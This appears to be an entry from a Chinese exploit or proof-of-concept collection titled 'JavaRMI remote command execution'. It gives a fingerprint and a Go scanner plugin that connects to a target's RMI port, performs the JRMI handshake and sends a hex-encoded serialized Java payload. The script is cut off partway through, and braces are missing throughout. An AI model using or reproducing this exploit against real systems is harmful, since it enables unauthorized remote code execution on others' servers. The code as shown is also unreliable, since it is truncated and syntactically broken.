# JavaRMI存在远程命令执行

- **系统**：JavaRMI　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`header="JESSIONID"`

**请求体 / payload**
```
package plugins
import (
"encoding/hex"
"fmt"
"goplugins/poccheck"
"io"
"log"
"net"
"net/url"
"strconv"
"strings"
"time"
)
// 这儿必须填POC_9830，后台程序会吧ABCD替换成自增的id
type POC_9830 struct {
func init() {
poccheck.Regist("POC_9830", &POC_9830{})
func (m *POC_9830) Do_poc(target string, args map[string]interface{}) map[string]interface{} {
result := map[string]interface{}{"match": false, "comment": "", "others": map[string]interface{}{}}
defer func() {
if err := recover(); err != nil {
fmt.Printf("%v", err)
}()
host, err := url.Parse(target)
if err != nil {
return result
port := host.Port()
// 建立tcp连接
conn, err := net.DialTimeout("tcp", host.Hostname()+":"+port, 5*time.Second)
if err != nil {
return result
// 向连接发送数据
JRMIHex, _ := hex.DecodeString("4a524d4900024b")
_, err = conn.Write(JRMIHex)
//读取返回数据
buf := make([]byte, 1024)
length, err := conn.Read(buf)
if err != nil {
return result
protocalAckHex := hex.EncodeToString(buf[:length])
length1, _ := strconv.ParseInt(protocalAckHex[4:6], 16, 64)
start := 6
end := start + int(length1*2)
ipHex := protocalAckHex[start:end]
ipLenHex := fmt.Sprintf("%04x", len(ipHex)/2)
// 需要补00，到19位 38长度
continueHex := fmt.Sprintf("%s%s", ipLenHex, ipHex)
if len(continueHex) < 39 {
continueHex = fmt.Sprintf("%s%s", continueHex, strings.Repeat("0", 38-len(continueHex)))
continueData, _ := hex.DecodeString(continueHex)
conn.Write(continueData)
JRMICallHex, _ := hex.DecodeString("50aced00057722000000000000000000000000000000000000000000000000000144154dc9d4e63b…（脚本共 10404 字，完整版见原文）
```
- **预期**：200　|　—